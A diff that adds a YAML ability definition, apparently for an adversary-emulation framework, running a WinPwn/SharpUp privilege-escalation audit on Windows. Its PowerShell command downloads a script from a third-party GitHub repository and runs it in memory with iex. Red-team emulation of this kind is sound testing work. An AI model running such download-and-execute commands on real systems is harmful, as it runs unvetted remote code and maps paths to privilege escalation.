@@ -1,0 +1,20 @@
+---
+- id: ad422306b82b29cad37ce277da7f5097
+  name: WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors
+  description: PowerSharpPack - Sharpup checking common Privesc vectors technique
+    via function of WinPwn - Takes several minutes to complete.
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: System Information Discovery
+  platforms:
+    windows:
+      psh:
+        command: $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t';
+          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1');
+          Invoke-SharpUp -command "audit"
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
